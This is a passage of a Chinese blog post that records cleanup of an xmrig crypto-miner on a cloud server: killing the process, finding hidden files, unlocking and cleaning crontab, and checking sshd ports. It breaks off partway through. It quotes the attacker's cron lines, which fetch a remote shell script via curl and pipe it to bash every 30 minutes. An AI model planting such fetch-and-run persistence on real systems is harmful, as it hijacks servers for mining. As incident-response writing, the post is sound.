rel="prefetch" href="/assets/index.html-CK8YIuvw.js" as="script"><link rel="prefetch" href="/assets/index.html-CBOdMFJw.js" as="script"><link rel="prefetch" href="/assets/index.html-BiSqRVRw.js" as="script"><link rel="prefetch" href="/assets/index.html-DGDaAiE8.js" as="script"><link rel="prefetch" href="/assets/index.html-fztFVC5v.js" as="script"><link rel="prefetch" href="/assets/index.html-BdfdwIcO.js" as="script"><link rel="prefetch" href="/assets/index.html-CRt0AOa6.js" as="script"><link rel="prefetch" href="/assets/index.html-CP-EjL8G.js" as="script"><link rel="prefetch" href="/assets/index.html-CdC5aYAc.js" as="script"><link rel="prefetch" href="/assets/index.html-W-HHKtjy.js" as="script"><link rel="prefetch" href="/assets/index.html-ButfZwja.js" as="script"><link rel="prefetch" href="/assets/index.html-C6T-fqqn.js" as="script"><link rel="prefetch" href="/assets/index.html-BoA28iCv.js" as="script"><link rel="prefetch" href="/assets/index.html-2VBG3ZSN.js" as="script"><link rel="prefetch" href="/assets/index.html-B67oe7s7.js" as="script"><link rel="prefetch" href="/assets/index.html-BKwBcKAw.js" as="script"><link rel="prefetch" href="/assets/index.html-DlauG0PE.js" as="script"><link rel="prefetch" href="/assets/index.html-Kz_zKOus.js" as="script"><link rel="prefetch" href="/assets/index.html-Bj75vPyc.js" as="script"><link rel="prefetch" href="/assets/index.html-CrQ2L5GB.js" as="script"><link rel="prefetch" href="/assets/index.html-Bxs2uCzC.js" as="script"><link rel="prefetch" href="/assets/index.html-Cmo4avBm.js" as="script"><link rel="prefetch" href="/assets/index.html-2oBrVqrV.js" as="script"><link rel="prefetch" href="/assets/index.html-BjE7IUFh.js" as="script"><link rel="prefetch" href="/assets/index.html-BnHQpqTM.js" as="script"><link rel="prefetch" href="/assets/index.html-DOhVprJf.js" as="script"><link rel="prefetch" href="/assets/index.html-Djz78Le0.js" as="script"><link rel="prefetch" href="/assets/index.html-BCD1Y9J7.js" as="script"><link rel="prefetch" href="/assets/index.html-xuV7y38m.js" as="script"><link rel="prefetch" href="/assets/index.html-Dq4dHXEO.js" as="script"><link rel="prefetch" href="/assets/index.html-uNZHlmh9.js" as="script"><link rel="prefetch" href="/assets/index.html-sMKx2fFx.js" as="script"><link rel="prefetch" href="/assets/index.html-DJxlB4Ru.js" as="script"><link rel="prefetch" href="/assets/index.html-B0akkb4x.js" as="script"><link rel="prefetch" href="/assets/index.html-BACPJaRX.js" as="script"><link rel="prefetch" href="/assets/index.html-CDEa0GWI.js" as="script"><link rel="prefetch" href="/assets/index.html-9tmG71T4.js" as="script"><link rel="prefetch" href="/assets/index.html-Dlw_mlyI.js" as="script"><link rel="prefetch" href="/assets/index.html-CRBUXiXf.js" as="script"><link rel="prefetch" href="/assets/index.html-DSzYh9y4.js" as="script"><link rel="prefetch" href="/assets/index.html-81HBqqyG.js" as="script"><link rel="prefetch" href="/assets/index.html-Bs_FrT1J.js" as="script"><link rel="prefetch" href="/assets/index.html-tG-ICNOO.js" as="script"><link rel="prefetch" href="/assets/index.html-B0pEdN3d.js" as="script"><link rel="prefetch" href="/assets/index.html-DDCkFDqG.js" as="script"><link rel="prefetch" href="/assets/index.html-5pygnFLu.js" as="script"><link rel="prefetch" href="/assets/index.html-o-m5JJhm.js" as="script"><link rel="prefetch" href="/assets/index.html-B_o6g2lT.js" as="script"><link rel="prefetch" href="/assets/index.html-C-AHbaU3.js" as="script"><link rel="prefetch" href="/assets/index.html-DiGqggcd.js" as="script"><link rel="prefetch" href="/assets/index.html-kJ6Zppz9.js" as="script"><link rel="prefetch" href="/assets/index.html-BltmNaR3.js" as="script"><link rel="prefetch" href="/assets/index.html-DivYTfvO.js" as="script"><link rel="prefetch" href="/assets/index.html-WvNHR-_7.js" as="script"><link rel="prefetch" href="/assets/index.html-DwiOsPN9.js" as="script"><link rel="prefetch" href="/assets/index.html-D48kLMrc.js" as="script"><link rel="prefetch" href="/assets/index.html-DflRpkjD.js" as="script"><link rel="prefetch" href="/assets/index.html-CabLZcnI.js" as="script"><link rel="prefetch" href="/assets/index.html-bfI10_Tb.js" as="script"><link rel="prefetch" href="/assets/index.html-QlWSrxgc.js" as="script"><link rel="prefetch" href="/assets/index.html-D6TRHMo_.js" as="script"><link rel="prefetch" href="/assets/index.html-BmHTp0Iy.js" as="script"><link rel="prefetch" href="/assets/index.html-C7fTEjiu.js" as="script"><link rel="prefetch" href="/assets/index.html-DkGR-0jo.js" as="script"><link rel="prefetch" href="/assets/index.html-BVvypR8N.js" as="script"><link rel="prefetch" href="/assets/index.html-CFeD49iy.js" as="script"><link rel="prefetch" href="/assets/index.html-Dgw-3h45.js" as="script"><link rel="prefetch" href="/assets/index.html-IHrCeSP8.js" as="script"><link rel="prefetch" href="/assets/index.html-D6uMhpPN.js" as="script"><link rel="prefetch" href="/assets/index.html-BJqX7m3N.js" as="script"><link rel="prefetch" href="/assets/index.html-DadjtuRN.js" as="script"><link rel="prefetch" href="/assets/index.html-Cz8rpQeW.js" as="script"><link rel="prefetch" href="/assets/index.html-BYC2tlB0.js" as="script"><link rel="prefetch" href="/assets/Python自学05-分支结构.html-CKI1ex4C.js" as="script"><link rel="prefetch" href="/assets/Python自学06-循环结构.html-CH-gwmxu.js" as="script"><link rel="prefetch" href="/assets/Python自学07-分支和循环结构实战代码.html-7zcpY5uM.js" as="script"><link rel="prefetch" href="/assets/Python自学08-常用数据结构之列表.html-BeQIskh0.js" as="script"><link rel="prefetch" href="/assets/Python自学09-常用数据结构之元组.html-CBoVLsZO.js" as="script"><link rel="prefetch" href="/assets/Python自学10-常用数据结构之字符串.html-CpvIwLTa.js" as="script"><link rel="prefetch" href="/assets/Python自学11 - 常用数据结构之集合.html-CNXSfA2g.js" as="script"><link rel="prefetch" href="/assets/Python自学12-常用数据结构之字典.html-BDeemMrr.js" as="script"><link rel="prefetch" href="/assets/Python自学13 — 函数和模块.html-D_ZgTrOI.js" as="script"><link rel="prefetch" href="/assets/Python自学14-面向对象编程.html-md2xKpXr.js" as="script"><link rel="prefetch" href="/assets/Python自学15 - 文件读写和异常处理.html-Bg1_rxHU.js" as="script"><link rel="prefetch" href="/assets/Python自学16 - 对象的序列化和反序列化.html-P-YRBIfh.js" as="script"><link rel="prefetch" href="/assets/Python自学17 - Python读写CSV文件.html-CGUMl2ur.js" as="script"><link rel="prefetch" href="/assets/Python自学18-Python读写Excel文件.html-ED8pmGPJ.js" as="script"><link rel="prefetch" href="/assets/Python自学19-Python操作Word和PowerPoint文件.html-Ba8-yv8r.js" as="script"><link rel="prefetch" href="/assets/Python自学20 - Python操作PDF文件.html-Bmb--QJ0.js" as="script"><link rel="prefetch" href="/assets/Python自学21 - Python处理图像.html-CSurcWS7.js" as="script"><link rel="prefetch" href="/assets/Python自学22 - 正则表达式的应用.html-uXs0-yCO.js" as="script"><link rel="prefetch" href="/assets/Python自学23 - Python编程惯例.html-BCNXZS_2.js" as="script"><link rel="prefetch" href="/assets/Python自学24 - Python接入MySQL数据库.html-C8VVWjes.js" as="script"><link rel="prefetch" href="/assets/Python自学25 - Django快速上手.html-pQstJqoD.js" as="script"><link rel="prefetch" href="/assets/Python自学26 - Cookie和Session.html-B-AToXM5.js" as="script"><link rel="prefetch" href="/assets/1.rsync-lsyncd的高效文件实时同步系统.html-CwD8JYHr.js" as="script"><link rel="prefetch" href="/assets/10.Linux操作系统基础-系统架构-文件系统与进程管理.html-DHIlnnUW.js" as="script"><link rel="prefetch" href="/assets/11.解析系统启动流程.html-CqVvJDex.js" as="script"><link rel="prefetch" href="/assets/12.用户与权限控制-用户组管理-sudo权限-ACL访问控制列表.html-Bbf_J3O4.js" as="script"><link rel="prefetch" href="/assets/13.文件系统管理-ext4-XFS-NTFS-文件系统特性-挂载与磁盘配额管理.html-Bet5rnxv.js" as="script"><link rel="prefetch" href="/assets/14.进程与服务管理-systemd-sysvinit 服务管理-定时服务cron-at.html-Ct0Q8T4j.js" as="script"><link rel="prefetch" href="/assets/15.软件包管理-rpm-dpkg-yum-dnf包管理工具及仓库配置.html-BgJ2xp0l.js" as="script"><link rel="prefetch" href="/assets/16.系统性能分析-top-htop-vmstat-sar等工具的使用与优化.html-CO05Ozoq.js" as="script"><link rel="prefetch" href="/assets/17.日志系统-rsyslog-journald等日志系统的配置与使用.html-DOhkdTYP.js" as="script"><link rel="prefetch" href="/assets/18.Linux系统性能调优-CPU-内存-磁盘IO等资源的优化策略.html-CohDP4dR.js" as="script"><link rel="prefetch" href="/assets/19.网络协议基础-TCP三次握手和四次挥手.html-DBQUybon.js" as="script"><link rel="prefetch" href="/assets/2.基于Keepalived的Nginx和HAProxy 高可用实战指南.html-D8a3Omuc.js" as="script"><link rel="prefetch" href="/assets/20.网络协议基础-HTTP和HTTPS协议.html-CUB5gC9g.js" as="script"><link rel="prefetch" href="/assets/21.网络协议基础-DNS工作原理.html-CpSManji.js" as="script"><link rel="prefetch" href="/assets/22.IP 地址管理-IPv4和IPv6地址规划-子网划分与CIDR.html-L5fLdWoc.js" as="script"><link rel="prefetch" href="/assets/23.网络设备配置-交换机-路由器OSPF和BGP防火墙策略管理.html-CqAoi-Dq.js" as="script"><link rel="prefetch" href="/assets/24.网络监控工具-ping-traceroute-nmap-Wireshark网络探测与分析.html-CGM6Dt3b.js" as="script"><link rel="prefetch" href="/assets/26.负载均衡技术-Nginx-HA-Proxy-F5等负载均衡配置与优化.html-QhIyG6b0.js" as="script"><link rel="prefetch" href="/assets/27.网络安全设备-入侵检测系统-IDS-入侵防御系统的配置与使用.html-B_GcxVYa.js" as="script"><link rel="prefetch" href="/assets/28.SDN与NFV-软件定义网络SDN与网络功能虚拟化NFV架构.html-BtJ9zRwR.js" as="script"><link rel="prefetch" href="/assets/29.网络自动化-Ansible-Netmiko网络设备批量配置与管理.html-BuB9n5_n.js" as="script"><link rel="prefetch" href="/assets/3.Linux常用命令完全指南.html-DiHMMGDU.js" as="script"><link rel="prefetch" href="/assets/30.存储介质选型-HDD-SSD-NVMe 性能对比与适用场景.html-CHGtQ-qs.js" as="script"><link rel="prefetch" href="/assets/31.RAID技术-RAID0-1-5-10原理配置与故障恢复.html-D-KTATls.js" as="script"><link rel="prefetch" href="/assets/4.Nginx如何获取客户端的真实IP？.html-CvpQX57C.js" as="script"><link rel="prefetch" href="/assets/5.Python分析Nginx日志.html-ZC8lWbrg.js" as="script"><link rel="prefetch" href="/assets/6.利用GoAccess分析web服务日志.html-C0HxDT5F.js" as="script"><link rel="prefetch" href="/assets/7.部署企业级ELK _ Kafka _ Filebeat.html-CskvlpEZ.js" as="script"><link rel="prefetch" href="/assets/8.Linux常用命令完全指南.html-BK5_DJ0_.js" as="script"><link rel="prefetch" href="/assets/9.Squid代理搭建全指南.html-CoU2NEBb.js" as="script"><link rel="prefetch" href="/assets/404.html-B-k3T0_t.js" as="script"><link rel="prefetch" href="/assets/index.html-CUayENLK.js" as="script"><link rel="prefetch" href="/assets/index.html-Cv1Ckgo4.js" as="script"><link rel="prefetch" href="/assets/index.html-BzumLOL3.js" as="script"><link rel="prefetch" href="/assets/index.html-Cf2FhYOX.js" as="script"><link rel="prefetch" href="/assets/index.html-BbUQrIgW.js" as="script"><link rel="prefetch" href="/assets/index.html-BV63LAYM.js" as="script"><link rel="prefetch" href="/assets/index.html-DqUTbpax.js" as="script"><link rel="prefetch" href="/assets/index.html-ClWGULwg.js" as="script"><link rel="prefetch" href="/assets/index.html-CGSc1Djm.js" as="script"><link rel="prefetch" href="/assets/photoswipe.esm-D2Nf-uDI.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">Skip to main content</a><!--]--><!--[--><div class="theme-container external-link-icon has-toc" vp-container><!--[--><header id="navbar" class="vp-navbar" vp-navbar><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><a class="route-link vp-brand" href="/" aria-label="Take me home"><!----><!----><span class="vp-site-name">星哥的私有笔记</span></a><!--]--></div><div class="vp-navbar-center"><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/" aria-label="首页"><!---->首页<!----></a></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="Linux基础教程"><!--[--><!---->Linux基础教程<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/linux-basis/" aria-label="基础知识"><!---->基础知识<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/devops/" aria-label="DevOps"><!---->DevOps<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/web/" aria-label="WEB服务"><!---->WEB服务<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/file-system/" aria-label="文件系统"><!---->文件系统<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/nginx/" aria-label="Nginx"><!---->Nginx<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/docker/" aria-label="Docker"><!---->Docker<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="开源软件"><!--[--><!---->开源软件<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/Open-Source-Software/" aria-label="开源软件"><!---->开源软件<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/Open-databases/" aria-label="数据库"><!---->数据库<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/android/" aria-label="安卓相关"><!---->安卓相关<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/jumpserver/" aria-label="JumpServer"><!---->JumpServer<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="云服务"><!--[--><!---->云服务<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/aliyun/" aria-label="阿里云"><!---->阿里云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/tengxunyun/" aria-label="腾讯云"><!---->腾讯云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/tengxunyun2025/" aria-label="腾讯云"><!---->腾讯云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/aws/" aria-label="亚马逊云"><!---->亚马逊云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/other/" aria-label="其他"><!---->其他<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/safe/" aria-label="服务器安全"><!---->服务器安全<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/software/" aria-label="常用软件"><!---->常用软件<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/internet/" aria-label="互联网福利"><!---->互联网福利<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/debug/" aria-label="调试Debug"><!---->调试Debug<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="auto-link external-link" href="https://github.com/funet8/vuepress-v2.xgss.net.git" aria-label="GitHub" rel="noopener noreferrer" target="_blank"><!---->GitHub<!----></a></div></nav><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!----><div class="vp-nav-item hide-in-mobile"><button type="button" class="vp-color-mode-switch" id="color-mode-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" name="auto" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" name="dark" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" name="light" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar" vp-sidebar><!----><ul class="vp-sidebar-links"><li><a class="route-link auto-link vp-sidebar-link" href="/" aria-label="首页"><!---->首页<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">ChatGPT</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">开源</span><span class="vp-arrow end"></span></button><!----></section></li><li><a class="route-link auto-link vp-sidebar-link" href="/linux-basis/" aria-label="基础知识"><!---->基础知识<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/internet2025/" aria-label="互联网2025"><!---->互联网2025<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/NAS/" aria-label="NAS"><!---->NAS<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/Rocky-Linux/" aria-label="Rocky-Linux"><!---->Rocky-Linux<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/safe/" aria-label="网络安全"><!---->网络安全<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/mysql/" aria-label="MySQL"><!---->MySQL<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/nginx/" aria-label="Nginx"><!---->Nginx<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/shell/" aria-label="Shell"><!---->Shell<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/Ubuntu/" aria-label="Ubuntu"><!---->Ubuntu<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/hardware/" aria-label="硬件"><!---->硬件<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/git/" aria-label="Git"><!---->Git<!----></a></li></ul><!----></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->20230817-阿里云美国某节点服务器被挂挖矿恶意软件的解决</h1><div class="page-info"><!----><!----><span class="page-date-info" aria-label="Writing Date📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon" name="calendar"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span data-allow-mismatch="text">6/5/25</span><meta property="datePublished" content="2025-06-05T08:18:16.000Z"></span><!----><span class="page-reading-time-info" aria-label="Reading Time⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon" name="timer"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>About 20 min</span><meta property="timeRequired" content="PT20M"></span><!----><!----></div><hr></div><!----><div class="" vp-content><!----><div id="markdown-content"><h1 id="_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本" tabindex="-1"><a class="header-anchor" href="#_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本"><span>20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法，分析恶意脚本</span></a></h1><h2 id="报警短信" tabindex="-1"><a class="header-anchor" href="#报警短信"><span>报警短信</span></a></h2><p>凌晨收到告警短信，爬起来解决问题先。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>【某里云】尊敬的XXXX - XXXX ,云监控-云服务器ECS&lt;美西-XXX-XXX-XXX/XXX.XXX.XXX.XXX&gt;于&lt;2023-08-17 02:17:32&gt;发生报警，(Agent)cpu.total（99.78%&gt;=80%），持续时间0分钟</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="ssh远程进入系统" tabindex="-1"><a class="header-anchor" href="#ssh远程进入系统"><span>SSH远程进入系统</span></a></h2><p>查看原因</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>top查看负载</span></span>
<span class="line"><span>有一个熟悉有陌生的进程 xmrig 挖矿软件</span></span>
<span class="line"><span></span></span>
<span class="line"><span># ps aux |grep xmrig</span></span>
<span class="line"><span>/etc/.system/php/xmrig --config=/etc/.system/php/config.json </span></span>
<span class="line"><span></span></span>
<span class="line"><span>kill掉进程</span></span>
<span class="line"><span>进程杀不到，杀了又启动一个</span></span>
<span class="line"><span></span></span>
<span class="line"><span>于是删除目录： </span></span>
<span class="line"><span>rm -rf /etc/.system/</span></span>
<span class="line"><span>再杀进程，发现进程没有了，</span></span>
<span class="line"><span>不出意外过几分钟可能会再次启动的。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>判断服务器是被挂了挖矿的恶意软件！</p><p><img src="https://imgoss.xgss.net/picgo/bingdu-ecs-guama.jpg?aliyun" alt="bingdu-ecs-guama"></p><h2 id="查看定时任务" tabindex="-1"><a class="header-anchor" href="#查看定时任务"><span>查看定时任务</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>ll /etc/crontab</span></span>
<span class="line"><span>-rw-r--r-- 1 root root 151 May 15  2018 /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>cat /etc/crontab</span></span>
<span class="line"><span>*/30 * * * * root curl -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash </span></span>
<span class="line"><span>*/30 * * * * root cd1 -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash </span></span>
<span class="line"><span></span></span>
<span class="line"><span>ll /etc/cron</span></span>
<span class="line"><span>cron.d/       cron.daily/   cron.deny     cron.hourly/  cron.monthly/ crontab       crontab~      crontaz~      cron.weekly/  </span></span>
<span class="line"><span></span></span>
<span class="line"><span>刻意的文件有</span></span>
<span class="line"><span>crontab       crontab~      crontaz~ </span></span>
<span class="line"><span>文件内容都是 每30分钟从 某个IP中下载一个恶意脚本并且执行</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="无法编辑" tabindex="-1"><a class="header-anchor" href="#无法编辑"><span>无法编辑</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chmod 777 -R /etc/crontab</span></span>
<span class="line"><span>chmod: changing permissions of ‘/etc/crontab’: Operation not permitted</span></span>
<span class="line"><span>vi /etc/crontab 也没有权限</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解决：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>chattr -ia /var/spool/cron</span></span>
<span class="line"><span>chattr -ia /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>vi /etc/crontab</span></span>
<span class="line"><span>rm -rf   /etc/crontab~</span></span>
<span class="line"><span>rm -rf /etc/crontaz~</span></span>
<span class="line"><span>systemctl restart crond</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="去掉远程密钥登录" tabindex="-1"><a class="header-anchor" href="#去掉远程密钥登录"><span>去掉远程密钥登录</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># netstat -tunpl|grep ssh</span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      28838/sshd          </span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:11222           0.0.0.0:*               LISTEN      28838/sshd          </span></span>
